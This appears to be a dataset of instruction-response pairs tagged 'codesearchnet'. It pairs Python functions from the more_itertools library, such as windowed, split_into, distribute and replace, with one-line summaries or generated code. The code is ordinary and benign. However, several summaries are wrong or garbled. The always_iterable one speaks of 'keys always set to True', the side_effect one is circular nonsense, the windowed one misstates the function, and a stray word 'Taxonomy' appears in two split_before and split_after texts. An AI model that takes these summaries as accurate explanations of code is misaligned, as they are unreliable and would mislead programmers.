{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef windowed(seq, n, fillvalue=None, step=1):\n    if n < 0:\n        raise ValueError('n must be >= 0')\n    if n == 0:\n        yield tuple()\n        return\n    if step < 1:\n        raise ValueError('step must be >= 1')\n\n    it = iter(seq)\n    window = deque([], n)\n    append = window.append\n\n    # Initial deque fill\n    for _ in range(n):\n        append(next(it, fillvalue))\n    yield tuple(window)\n\n    # Appending new items to the right causes old items to fall off the left\n    i = 0\n    for item in it:\n        append(item)\n        i = (i + 1) % step\n        if i % step == 0:\n            yield tuple(window)\n\n    # If there are items from the iterable in the window, pad with the given\n    # value and emit them.\n    if (i % step) and (step - i < n):\n        for _ in range(step - i):\n            append(fillvalue)\n        yield tuple(window)", "response": "Yields n items from the given iterable."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef substrings(iterable):\n    # The length-1 substrings\n    seq = []\n    for item in iter(iterable):\n        seq.append(item)\n        yield (item,)\n    seq = tuple(seq)\n    item_count = len(seq)\n\n    # And the rest\n    for n in range(2, item_count + 1):\n        for i in range(item_count - n + 1):\n            yield seq[i:i + n]", "response": "Yield all of the substrings of iterable."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef substrings_indexes(seq, reverse=False):\n    r = range(1, len(seq) + 1)\n    if reverse:\n        r = reversed(r)\n    return (\n        (seq[i:i + L], i, i + L) for L in r for i in range(len(seq) - L + 1)\n    )", "response": "Yield all substrings and their positions in seq"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef spy(iterable, n=1):\n    it = iter(iterable)\n    head = take(n, it)\n\n    return head, chain(head, it)", "response": "Return a 2 - tuple with a list containing the first n elements of iterable and an iterator with the same items as iterable*."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a new iterable yielding from each iterable in turn skipping any that are exhausted.", "response": "def interleave_longest(*iterables):\n    \"\"\"Return a new iterable yielding from each iterable in turn,\n    skipping any that are exhausted.\n\n        >>> list(interleave_longest([1, 2, 3], [4, 5], [6, 7, 8]))\n        [1, 4, 6, 2, 5, 7, 3, 8]\n\n    This function produces the same output as :func:`roundrobin`, but may\n    perform better for some inputs (in particular when the number of iterables\n    is large).\n\n    \"\"\"\n    i = chain.from_iterable(zip_longest(*iterables, fillvalue=_marker))\n    return (x for x in i if x is not _marker)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef collapse(iterable, base_type=None, levels=None):\n    def walk(node, level):\n        if (\n            ((levels is not None) and (level > levels)) or\n            isinstance(node, (str, bytes)) or\n            ((base_type is not None) and isinstance(node, base_type))\n        ):\n            yield node\n            return\n\n        try:\n            tree = iter(node)\n        except TypeError:\n            yield node\n            return\n        else:\n            for child in tree:\n                for x in walk(child, level + 1):\n                    yield x\n\n    yield from walk(iterable, 0)", "response": "Flatten an iterable with multiple levels of nesting into non - iterable types."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef side_effect(func, iterable, chunk_size=None, before=None, after=None):\n    try:\n        if before is not None:\n            before()\n\n        if chunk_size is None:\n            for item in iterable:\n                func(item)\n                yield item\n        else:\n            for chunk in chunked(iterable, chunk_size):\n                func(chunk)\n                yield from chunk\n    finally:\n        if after is not None:\n            after()", "response": "A generator that yields items from the given iterable in order to yield them."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef sliced(seq, n):\n    return takewhile(bool, (seq[i: i + n] for i in count(0, n)))", "response": "Yields slices of length n from the sequence seq."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nyielding lists of items from iterable where each list is delimited by an item where callable pred returns True.", "response": "def split_at(iterable, pred):\n    \"\"\"Yield lists of items from *iterable*, where each list is delimited by\n    an item where callable *pred* returns ``True``. The lists do not include\n    the delimiting items.\n\n        >>> list(split_at('abcdcba', lambda x: x == 'b'))\n        [['a'], ['c', 'd', 'c'], ['a']]\n\n        >>> list(split_at(range(10), lambda n: n % 2 == 1))\n        [[0], [2], [4], [6], [8], []]\n    \"\"\"\n    buf = []\n    for item in iterable:\n        if pred(item):\n            yield buf\n            buf = []\n        else:\n            buf.append(item)\n    yield buf"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef split_before(iterable, pred):\n    buf = []\n    for item in iterable:\n        if pred(item) and buf:\n            yield buf\n            buf = []\n        buf.append(item)\n    yield buf", "response": "Yields lists of items from iterable where each list starts with an\nTaxonomy item where callable pred returns True"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nyield lists of items from iterable where each list ends with an Taxonomy item where callable pred returns True", "response": "def split_after(iterable, pred):\n    \"\"\"Yield lists of items from *iterable*, where each list ends with an\n    item where callable *pred* returns ``True``:\n\n        >>> list(split_after('one1two2', lambda s: s.isdigit()))\n        [['o', 'n', 'e', '1'], ['t', 'w', 'o', '2']]\n\n        >>> list(split_after(range(10), lambda n: n % 3 == 0))\n        [[0], [1, 2, 3], [4, 5, 6], [7, 8, 9]]\n\n    \"\"\"\n    buf = []\n    for item in iterable:\n        buf.append(item)\n        if pred(item) and buf:\n            yield buf\n            buf = []\n    if buf:\n        yield buf"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nyields a list of sequential items from iterable of length n in sizes.", "response": "def split_into(iterable, sizes):\n    \"\"\"Yield a list of sequential items from *iterable* of length 'n' for each\n    integer 'n' in *sizes*.\n\n        >>> list(split_into([1,2,3,4,5,6], [1,2,3]))\n        [[1], [2, 3], [4, 5, 6]]\n\n    If the sum of *sizes* is smaller than the length of *iterable*, then the\n    remaining items of *iterable* will not be returned.\n\n        >>> list(split_into([1,2,3,4,5,6], [2,3]))\n        [[1, 2], [3, 4, 5]]\n\n    If the sum of *sizes* is larger than the length of *iterable*, fewer items\n    will be returned in the iteration that overruns *iterable* and further\n    lists will be empty:\n\n        >>> list(split_into([1,2,3,4], [1,2,3,4]))\n        [[1], [2, 3], [4], []]\n\n    When a ``None`` object is encountered in *sizes*, the returned list will\n    contain items up to the end of *iterable* the same way that itertools.slice\n    does:\n\n        >>> list(split_into([1,2,3,4,5,6,7,8,9,0], [2,3,None]))\n        [[1, 2], [3, 4, 5], [6, 7, 8, 9, 0]]\n\n    :func:`split_into` can be useful for grouping a series of items where the\n    sizes of the groups are not uniform. An example would be where in a row\n    from a table, multiple columns represent elements of the same feature\n    (e.g. a point represented by x,y,z) but, the format is not the same for\n    all columns.\n    \"\"\"\n    # convert the iterable argument into an iterator so its contents can\n    # be consumed by islice in case it is a generator\n    it = iter(iterable)\n\n    for size in sizes:\n        if size is None:\n            yield list(it)\n            return\n        else:\n            yield list(islice(it, size))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nyielding the elements from iterable followed by fillvalue.", "response": "def padded(iterable, fillvalue=None, n=None, next_multiple=False):\n    \"\"\"Yield the elements from *iterable*, followed by *fillvalue*, such that\n    at least *n* items are emitted.\n\n        >>> list(padded([1, 2, 3], '?', 5))\n        [1, 2, 3, '?', '?']\n\n    If *next_multiple* is ``True``, *fillvalue* will be emitted until the\n    number of items emitted is a multiple of *n*::\n\n        >>> list(padded([1, 2, 3, 4], n=3, next_multiple=True))\n        [1, 2, 3, 4, None, None]\n\n    If *n* is ``None``, *fillvalue* will be emitted indefinitely.\n\n    \"\"\"\n    it = iter(iterable)\n    if n is None:\n        yield from chain(it, repeat(fillvalue))\n    elif n < 1:\n        raise ValueError('n must be at least 1')\n    else:\n        item_count = 0\n        for item in it:\n            yield item\n            item_count += 1\n\n        remaining = (n - item_count) % n if next_multiple else n - item_count\n        for _ in range(remaining):\n            yield fillvalue"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ndistributes the items from *iterable* among n smaller iterables.", "response": "def distribute(n, iterable):\n    \"\"\"Distribute the items from *iterable* among *n* smaller iterables.\n\n        >>> group_1, group_2 = distribute(2, [1, 2, 3, 4, 5, 6])\n        >>> list(group_1)\n        [1, 3, 5]\n        >>> list(group_2)\n        [2, 4, 6]\n\n    If the length of *iterable* is not evenly divisible by *n*, then the\n    length of the returned iterables will not be identical:\n\n        >>> children = distribute(3, [1, 2, 3, 4, 5, 6, 7])\n        >>> [list(c) for c in children]\n        [[1, 4, 7], [2, 5], [3, 6]]\n\n    If the length of *iterable* is smaller than *n*, then the last returned\n    iterables will be empty:\n\n        >>> children = distribute(5, [1, 2, 3])\n        >>> [list(c) for c in children]\n        [[1], [2], [3], [], []]\n\n    This function uses :func:`itertools.tee` and may require significant\n    storage. If you need the order items in the smaller iterables to match the\n    original iterable, see :func:`divide`.\n\n    \"\"\"\n    if n < 1:\n        raise ValueError('n must be at least 1')\n\n    children = tee(iterable, n)\n    return [islice(it, index, None, n) for index, it in enumerate(children)]"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nyields tuples whose elements are offset from iterable.", "response": "def stagger(iterable, offsets=(-1, 0, 1), longest=False, fillvalue=None):\n    \"\"\"Yield tuples whose elements are offset from *iterable*.\n    The amount by which the `i`-th item in each tuple is offset is given by\n    the `i`-th item in *offsets*.\n\n        >>> list(stagger([0, 1, 2, 3]))\n        [(None, 0, 1), (0, 1, 2), (1, 2, 3)]\n        >>> list(stagger(range(8), offsets=(0, 2, 4)))\n        [(0, 2, 4), (1, 3, 5), (2, 4, 6), (3, 5, 7)]\n\n    By default, the sequence will end when the final element of a tuple is the\n    last item in the iterable. To continue until the first element of a tuple\n    is the last item in the iterable, set *longest* to ``True``::\n\n        >>> list(stagger([0, 1, 2, 3], longest=True))\n        [(None, 0, 1), (0, 1, 2), (1, 2, 3), (2, 3, None), (3, None, None)]\n\n    By default, ``None`` will be used to replace offsets beyond the end of the\n    sequence. Specify *fillvalue* to use some other value.\n\n    \"\"\"\n    children = tee(iterable, len(offsets))\n\n    return zip_offset(\n        *children, offsets=offsets, longest=longest, fillvalue=fillvalue\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef zip_offset(*iterables, offsets, longest=False, fillvalue=None):\n    if len(iterables) != len(offsets):\n        raise ValueError(\"Number of iterables and offsets didn't match\")\n\n    staggered = []\n    for it, n in zip(iterables, offsets):\n        if n < 0:\n            staggered.append(chain(repeat(fillvalue, -n), it))\n        elif n > 0:\n            staggered.append(islice(it, n, None))\n        else:\n            staggered.append(it)\n\n    if longest:\n        return zip_longest(*staggered, fillvalue=fillvalue)\n\n    return zip(*staggered)", "response": "zip the input iterables but offset the i - th item in the given offsets."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the input iterables sorted together with the given key_list as the priority for sorting.", "response": "def sort_together(iterables, key_list=(0,), reverse=False):\n    \"\"\"Return the input iterables sorted together, with *key_list* as the\n    priority for sorting. All iterables are trimmed to the length of the\n    shortest one.\n\n    This can be used like the sorting function in a spreadsheet. If each\n    iterable represents a column of data, the key list determines which\n    columns are used for sorting.\n\n    By default, all iterables are sorted using the ``0``-th iterable::\n\n        >>> iterables = [(4, 3, 2, 1), ('a', 'b', 'c', 'd')]\n        >>> sort_together(iterables)\n        [(1, 2, 3, 4), ('d', 'c', 'b', 'a')]\n\n    Set a different key list to sort according to another iterable.\n    Specifying multiple keys dictates how ties are broken::\n\n        >>> iterables = [(3, 1, 2), (0, 1, 0), ('c', 'b', 'a')]\n        >>> sort_together(iterables, key_list=(1, 2))\n        [(2, 3, 1), (0, 0, 1), ('a', 'c', 'b')]\n\n    Set *reverse* to ``True`` to sort in descending order.\n\n        >>> sort_together([(1, 2, 3), ('c', 'b', 'a')], reverse=True)\n        [(3, 2, 1), ('a', 'b', 'c')]\n\n    \"\"\"\n    return list(zip(*sorted(zip(*iterables),\n                            key=itemgetter(*key_list),\n                            reverse=reverse)))"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns an iterable of all the keys that are always set to True.", "response": "def always_iterable(obj, base_type=(str, bytes)):\n    \"\"\"If *obj* is iterable, return an iterator over its items::\n\n        >>> obj = (1, 2, 3)\n        >>> list(always_iterable(obj))\n        [1, 2, 3]\n\n    If *obj* is not iterable, return a one-item iterable containing *obj*::\n\n        >>> obj = 1\n        >>> list(always_iterable(obj))\n        [1]\n\n    If *obj* is ``None``, return an empty iterable:\n\n        >>> obj = None\n        >>> list(always_iterable(None))\n        []\n\n    By default, binary and text strings are not considered iterable::\n\n        >>> obj = 'foo'\n        >>> list(always_iterable(obj))\n        ['foo']\n\n    If *base_type* is set, objects for which ``isinstance(obj, base_type)``\n    returns ``True`` won't be considered iterable.\n\n        >>> obj = {'a': 1}\n        >>> list(always_iterable(obj))  # Iterate over the dict's keys\n        ['a']\n        >>> list(always_iterable(obj, base_type=dict))  # Treat dicts as a unit\n        [{'a': 1}]\n\n    Set *base_type* to ``None`` to avoid any special handling and treat objects\n    Python considers iterable as iterable:\n\n        >>> obj = 'foo'\n        >>> list(always_iterable(obj, base_type=None))\n        ['f', 'o', 'o']\n    \"\"\"\n    if obj is None:\n        return iter(())\n\n    if (base_type is not None) and isinstance(obj, base_type):\n        return iter((obj,))\n\n    try:\n        return iter(obj)\n    except TypeError:\n        return iter((obj,))"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns an iterable over the items that satisfy the predicate and the item is adjacent to an item that does not satisfy the predicate.", "response": "def adjacent(predicate, iterable, distance=1):\n    \"\"\"Return an iterable over `(bool, item)` tuples where the `item` is\n    drawn from *iterable* and the `bool` indicates whether\n    that item satisfies the *predicate* or is adjacent to an item that does.\n\n    For example, to find whether items are adjacent to a ``3``::\n\n        >>> list(adjacent(lambda x: x == 3, range(6)))\n        [(False, 0), (False, 1), (True, 2), (True, 3), (True, 4), (False, 5)]\n\n    Set *distance* to change what counts as adjacent. For example, to find\n    whether items are two places away from a ``3``:\n\n        >>> list(adjacent(lambda x: x == 3, range(6), distance=2))\n        [(False, 0), (True, 1), (True, 2), (True, 3), (True, 4), (True, 5)]\n\n    This is useful for contextualizing the results of a search function.\n    For example, a code comparison tool might want to identify lines that\n    have changed, but also surrounding lines to give the viewer of the diff\n    context.\n\n    The predicate function will only be called once for each item in the\n    iterable.\n\n    See also :func:`groupby_transform`, which can be used with this function\n    to group ranges of items with the same `bool` value.\n\n    \"\"\"\n    # Allow distance=0 mainly for testing that it reproduces results with map()\n    if distance < 0:\n        raise ValueError('distance must be at least 0')\n\n    i1, i2 = tee(iterable)\n    padding = [False] * distance\n    selected = chain(padding, map(predicate, i1), padding)\n    adjacent_to_selected = map(any, windowed(selected, 2 * distance + 1))\n    return zip(adjacent_to_selected, i2)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef groupby_transform(iterable, keyfunc=None, valuefunc=None):\n    valuefunc = (lambda x: x) if valuefunc is None else valuefunc\n    return ((k, map(valuefunc, g)) for k, g in groupby(iterable, keyfunc))", "response": "An extension of itertools. groupby that transforms the values of the items of the iterable after grouping them."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef count_cycle(iterable, n=None):\n    iterable = tuple(iterable)\n    if not iterable:\n        return iter(())\n    counter = count() if n is None else range(n)\n    return ((i, item) for i in counter for item in iterable)", "response": "Cycle through the items from iterable up to n times yielding\n    the number of completed cycles along with each item."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nyields the index of each item in iterable for which pred returns True.", "response": "def locate(iterable, pred=bool, window_size=None):\n    \"\"\"Yield the index of each item in *iterable* for which *pred* returns\n    ``True``.\n\n    *pred* defaults to :func:`bool`, which will select truthy items:\n\n        >>> list(locate([0, 1, 1, 0, 1, 0, 0]))\n        [1, 2, 4]\n\n    Set *pred* to a custom function to, e.g., find the indexes for a particular\n    item.\n\n        >>> list(locate(['a', 'b', 'c', 'b'], lambda x: x == 'b'))\n        [1, 3]\n\n    If *window_size* is given, then the *pred* function will be called with\n    that many items. This enables searching for sub-sequences:\n\n        >>> iterable = [0, 1, 2, 3, 0, 1, 2, 3, 0, 1, 2, 3]\n        >>> pred = lambda *args: args == (1, 2, 3)\n        >>> list(locate(iterable, pred=pred, window_size=3))\n        [1, 5, 9]\n\n    Use with :func:`seekable` to find indexes and then retrieve the associated\n    items:\n\n        >>> from itertools import count\n        >>> from more_itertools import seekable\n        >>> source = (3 * n + 1 if (n % 2) else n // 2 for n in count())\n        >>> it = seekable(source)\n        >>> pred = lambda x: x > 100\n        >>> indexes = locate(it, pred=pred)\n        >>> i = next(indexes)\n        >>> it.seek(i)\n        >>> next(it)\n        106\n\n    \"\"\"\n    if window_size is None:\n        return compress(count(), map(pred, iterable))\n\n    if window_size < 1:\n        raise ValueError('window size must be at least 1')\n\n    it = windowed(iterable, window_size, fillvalue=_marker)\n    return compress(count(), starmap(pred, it))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nyield the items from iterable but strip any from the end for which pred returns True.", "response": "def rstrip(iterable, pred):\n    \"\"\"Yield the items from *iterable*, but strip any from the end\n    for which *pred* returns ``True``.\n\n    For example, to remove a set of items from the end of an iterable:\n\n        >>> iterable = (None, False, None, 1, 2, None, 3, False, None)\n        >>> pred = lambda x: x in {None, False, ''}\n        >>> list(rstrip(iterable, pred))\n        [None, False, None, 1, 2, None, 3]\n\n    This function is analogous to :func:`str.rstrip`.\n\n    \"\"\"\n    cache = []\n    cache_append = cache.append\n    cache_clear = cache.clear\n    for x in iterable:\n        if pred(x):\n            cache_append(x)\n        else:\n            yield from cache\n            cache_clear()\n            yield x"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef islice_extended(iterable, *args):\n    s = slice(*args)\n    start = s.start\n    stop = s.stop\n    if s.step == 0:\n        raise ValueError('step argument must be a non-zero integer or None.')\n    step = s.step or 1\n\n    it = iter(iterable)\n\n    if step > 0:\n        start = 0 if (start is None) else start\n\n        if (start < 0):\n            # Consume all but the last -start items\n            cache = deque(enumerate(it, 1), maxlen=-start)\n            len_iter = cache[-1][0] if cache else 0\n\n            # Adjust start to be positive\n            i = max(len_iter + start, 0)\n\n            # Adjust stop to be positive\n            if stop is None:\n                j = len_iter\n            elif stop >= 0:\n                j = min(stop, len_iter)\n            else:\n                j = max(len_iter + stop, 0)\n\n            # Slice the cache\n            n = j - i\n            if n <= 0:\n                return\n\n            for index, item in islice(cache, 0, n, step):\n                yield item\n        elif (stop is not None) and (stop < 0):\n            # Advance to the start position\n            next(islice(it, start, start), None)\n\n            # When stop is negative, we have to carry -stop items while\n            # iterating\n            cache = deque(islice(it, -stop), maxlen=-stop)\n\n            for index, item in enumerate(it):\n                cached_item = cache.popleft()\n                if index % step == 0:\n                    yield cached_item\n                cache.append(item)\n        else:\n            # When both start and stop are positive we have the normal case\n            yield from islice(it, start, stop, step)\n    else:\n        start = -1 if (start is None) else start\n\n        if (stop is not None) and (stop < 0):\n            # Consume all but the last items\n            n = -stop - 1\n            cache = deque(enumerate(it, 1), maxlen=n)\n            len_iter = cache[-1][0] if cache else 0\n\n            # If start and stop are both negative they are comparable and\n            # we can just slice. Otherwise we can adjust start to be negative\n            # and then slice.\n            if start < 0:\n                i, j = start, stop\n            else:\n                i, j = min(start - len_iter, -1), None\n\n            for index, item in list(cache)[i:j:step]:\n                yield item\n        else:\n            # Advance to the stop position\n            if stop is not None:\n                m = stop + 1\n                next(islice(it, m, m), None)\n\n            # stop is positive, so if start is negative they are not comparable\n            # and we need the rest of the items.\n            if start < 0:\n                i = start\n                n = None\n            # stop is None and start is positive, so we just need items up to\n            # the start index.\n            elif stop is None:\n                i = None\n                n = start + 1\n            # Both stop and start are positive, so they are comparable.\n            else:\n                i = None\n                n = start - stop\n                if n <= 0:\n                    return\n\n            cache = list(islice(it, n))\n\n            yield from cache[i::step]", "response": "A non - recursive version of itertools. islice that supports negative values\n            for start stop and step."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nyield consecutive items from an iterable using the given ordering function.", "response": "def consecutive_groups(iterable, ordering=lambda x: x):\n    \"\"\"Yield groups of consecutive items using :func:`itertools.groupby`.\n    The *ordering* function determines whether two items are adjacent by\n    returning their position.\n\n    By default, the ordering function is the identity function. This is\n    suitable for finding runs of numbers:\n\n        >>> iterable = [1, 10, 11, 12, 20, 30, 31, 32, 33, 40]\n        >>> for group in consecutive_groups(iterable):\n        ...     print(list(group))\n        [1]\n        [10, 11, 12]\n        [20]\n        [30, 31, 32, 33]\n        [40]\n\n    For finding runs of adjacent letters, try using the :meth:`index` method\n    of a string of letters:\n\n        >>> from string import ascii_lowercase\n        >>> iterable = 'abcdfgilmnop'\n        >>> ordering = ascii_lowercase.index\n        >>> for group in consecutive_groups(iterable, ordering):\n        ...     print(list(group))\n        ['a', 'b', 'c', 'd']\n        ['f', 'g']\n        ['i']\n        ['l', 'm', 'n', 'o', 'p']\n\n    \"\"\"\n    for k, g in groupby(\n        enumerate(iterable), key=lambda x: x[0] - ordering(x[1])\n    ):\n        yield map(itemgetter(1), g)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef exactly_n(iterable, n, predicate=bool):\n    return len(take(n + 1, filter(predicate, iterable))) == n", "response": "Return True if exactly n items in the iterable are True."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef circular_shifts(iterable):\n    lst = list(iterable)\n    return take(len(lst), windowed(cycle(lst), len(lst)))", "response": "Return a list of circular shifts of iterable."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a decorator version of the given function that returns a new iterable.", "response": "def make_decorator(wrapping_func, result_index=0):\n    \"\"\"Return a decorator version of *wrapping_func*, which is a function that\n    modifies an iterable. *result_index* is the position in that function's\n    signature where the iterable goes.\n\n    This lets you use itertools on the \"production end,\" i.e. at function\n    definition. This can augment what the function returns without changing the\n    function's code.\n\n    For example, to produce a decorator version of :func:`chunked`:\n\n        >>> from more_itertools import chunked\n        >>> chunker = make_decorator(chunked, result_index=0)\n        >>> @chunker(3)\n        ... def iter_range(n):\n        ...     return iter(range(n))\n        ...\n        >>> list(iter_range(9))\n        [[0, 1, 2], [3, 4, 5], [6, 7, 8]]\n\n    To only allow truthy items to be returned:\n\n        >>> truth_serum = make_decorator(filter, result_index=1)\n        >>> @truth_serum(bool)\n        ... def boolean_test():\n        ...     return [0, 1, '', ' ', False, True]\n        ...\n        >>> list(boolean_test())\n        [1, ' ', True]\n\n    The :func:`peekable` and :func:`seekable` wrappers make for practical\n    decorators:\n\n        >>> from more_itertools import peekable\n        >>> peekable_function = make_decorator(peekable)\n        >>> @peekable_function()\n        ... def str_range(*args):\n        ...     return (str(x) for x in range(*args))\n        ...\n        >>> it = str_range(1, 20, 2)\n        >>> next(it), next(it), next(it)\n        ('1', '3', '5')\n        >>> it.peek()\n        '7'\n        >>> next(it)\n        '7'\n\n    \"\"\"\n    # See https://sites.google.com/site/bbayles/index/decorator_factory for\n    # notes on how this works.\n    def decorator(*wrapping_args, **wrapping_kwargs):\n        def outer_wrapper(f):\n            def inner_wrapper(*args, **kwargs):\n                result = f(*args, **kwargs)\n                wrapping_args_ = list(wrapping_args)\n                wrapping_args_.insert(result_index, result)\n                return wrapping_func(*wrapping_args_, **wrapping_kwargs)\n\n            return inner_wrapper\n\n        return outer_wrapper\n\n    return decorator"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nmap the items in iterable to categories", "response": "def map_reduce(iterable, keyfunc, valuefunc=None, reducefunc=None):\n    \"\"\"Return a dictionary that maps the items in *iterable* to categories\n    defined by *keyfunc*, transforms them with *valuefunc*, and\n    then summarizes them by category with *reducefunc*.\n\n    *valuefunc* defaults to the identity function if it is unspecified.\n    If *reducefunc* is unspecified, no summarization takes place:\n\n        >>> keyfunc = lambda x: x.upper()\n        >>> result = map_reduce('abbccc', keyfunc)\n        >>> sorted(result.items())\n        [('A', ['a']), ('B', ['b', 'b']), ('C', ['c', 'c', 'c'])]\n\n    Specifying *valuefunc* transforms the categorized items:\n\n        >>> keyfunc = lambda x: x.upper()\n        >>> valuefunc = lambda x: 1\n        >>> result = map_reduce('abbccc', keyfunc, valuefunc)\n        >>> sorted(result.items())\n        [('A', [1]), ('B', [1, 1]), ('C', [1, 1, 1])]\n\n    Specifying *reducefunc* summarizes the categorized items:\n\n        >>> keyfunc = lambda x: x.upper()\n        >>> valuefunc = lambda x: 1\n        >>> reducefunc = sum\n        >>> result = map_reduce('abbccc', keyfunc, valuefunc, reducefunc)\n        >>> sorted(result.items())\n        [('A', 1), ('B', 2), ('C', 3)]\n\n    You may want to filter the input iterable before applying the map/reduce\n    procedure:\n\n        >>> all_items = range(30)\n        >>> items = [x for x in all_items if 10 <= x <= 20]  # Filter\n        >>> keyfunc = lambda x: x % 2  # Evens map to 0; odds to 1\n        >>> categories = map_reduce(items, keyfunc=keyfunc)\n        >>> sorted(categories.items())\n        [(0, [10, 12, 14, 16, 18, 20]), (1, [11, 13, 15, 17, 19])]\n        >>> summaries = map_reduce(items, keyfunc=keyfunc, reducefunc=sum)\n        >>> sorted(summaries.items())\n        [(0, 90), (1, 75)]\n\n    Note that all items in the iterable are gathered into a list before the\n    summarization step, which may require significant storage.\n\n    The returned object is a :obj:`collections.defaultdict` with the\n    ``default_factory`` set to ``None``, such that it behaves like a normal\n    dictionary.\n\n    \"\"\"\n    valuefunc = (lambda x: x) if (valuefunc is None) else valuefunc\n\n    ret = defaultdict(list)\n    for item in iterable:\n        key = keyfunc(item)\n        value = valuefunc(item)\n        ret[key].append(value)\n\n    if reducefunc is not None:\n        for key, value_list in ret.items():\n            ret[key] = reducefunc(value_list)\n\n    ret.default_factory = None\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef rlocate(iterable, pred=bool, window_size=None):\n    if window_size is None:\n        try:\n            len_iter = len(iterable)\n            return (\n                len_iter - i - 1 for i in locate(reversed(iterable), pred)\n            )\n        except TypeError:\n            pass\n\n    return reversed(list(locate(iterable, pred, window_size)))", "response": "Returns the index of each item in iterable for which pred returns True starting from the right and moving left."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nyielding the items from iterable which pred returns True with the items from iterable substitutes.", "response": "def replace(iterable, pred, substitutes, count=None, window_size=1):\n    \"\"\"Yield the items from *iterable*, replacing the items for which *pred*\n    returns ``True`` with the items from the iterable *substitutes*.\n\n        >>> iterable = [1, 1, 0, 1, 1, 0, 1, 1]\n        >>> pred = lambda x: x == 0\n        >>> substitutes = (2, 3)\n        >>> list(replace(iterable, pred, substitutes))\n        [1, 1, 2, 3, 1, 1, 2, 3, 1, 1]\n\n    If *count* is given, the number of replacements will be limited:\n\n        >>> iterable = [1, 1, 0, 1, 1, 0, 1, 1, 0]\n        >>> pred = lambda x: x == 0\n        >>> substitutes = [None]\n        >>> list(replace(iterable, pred, substitutes, count=2))\n        [1, 1, None, 1, 1, None, 1, 1, 0]\n\n    Use *window_size* to control the number of items passed as arguments to\n    *pred*. This allows for locating and replacing subsequences.\n\n        >>> iterable = [0, 1, 2, 5, 0, 1, 2, 5]\n        >>> window_size = 3\n        >>> pred = lambda *args: args == (0, 1, 2)  # 3 items passed to pred\n        >>> substitutes = [3, 4] # Splice in these items\n        >>> list(replace(iterable, pred, substitutes, window_size=window_size))\n        [3, 4, 5, 3, 4, 5]\n\n    \"\"\"\n    if window_size < 1:\n        raise ValueError('window_size must be at least 1')\n\n    # Save the substitutes iterable, since it's used more than once\n    substitutes = tuple(substitutes)\n\n    # Add padding such that the number of windows matches the length of the\n    # iterable\n    it = chain(iterable, [_marker] * (window_size - 1))\n    windows = windowed(it, window_size)\n\n    n = 0\n    for w in windows:\n        # If the current window matches our predicate (and we haven't hit\n        # our maximum number of replacements), splice in the substitutes\n        # and then consume the following windows that overlap with this one.\n        # For example, if the iterable is (0, 1, 2, 3, 4...)\n        # and the window size is 2, we have (0, 1), (1, 2), (2, 3)...\n        # If the predicate matches on (0, 1), we need to zap (0, 1) and (1, 2)\n        if pred(*w):\n            if (count is None) or (n < count):\n                n += 1\n                yield from substitutes\n                consume(windows, window_size - 1)\n                continue\n\n        # If there was no match (or we've reached the replacement limit),\n        # yield the first item from the window.\n        if w and (w[0] is not _marker):\n            yield w[0]"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nyield all possible partitions of a given iterable.", "response": "def partitions(iterable):\n    \"\"\"Yield all possible partitions of *iterable*. This yields all the ways\n    to split the iterable, starting with the full iterable, all splits into\n    two pieces, all the splits into three pieces, and so on. Order is preserved\n    and repeated elements are treated as distinct.\n\n    >>> iterable = ['a', 'b', 'c', 'd']\n    >>> for part in partitions(iterable):\n    ...     print(part)\n    [['a', 'b', 'c', 'd']]\n    [['a'], ['b', 'c', 'd']]\n    [['a', 'b'], ['c', 'd']]\n    [['a', 'b', 'c'], ['d']]\n    [['a'], ['b'], ['c', 'd']]\n    [['a'], ['b', 'c'], ['d']]\n    [['a', 'b'], ['c'], ['d']]\n    [['a'], ['b'], ['c'], ['d']]\n\n    This is unrelated to :func:`partition`.\n\n    \"\"\"\n    sequence = list(iterable)\n    n = len(sequence)\n    for i in powerset(range(1, n)):\n        yield [sequence[i:j] for i, j in zip((0,) + i, i + (n,))]"}
